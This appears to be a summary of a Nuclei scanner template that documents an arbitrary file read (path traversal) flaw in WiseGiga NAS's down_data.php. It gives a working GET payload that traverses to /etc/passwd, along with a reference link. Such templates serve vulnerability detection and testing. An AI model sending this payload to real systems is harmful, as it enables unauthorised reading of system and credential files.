# Nuclei Template: WiseGiga NAS - Arbitrary File Read
**Template ID:** wisegiga-nas-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`wisegiga-nas-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WISEGIGA NAS down_data.php has an arbitrary file download vulnerability. Due to the lax filtering of the filename parameter on the /down_data.php page, sensitive system files can be read.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/WiseGiga%20NAS%20down_data.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
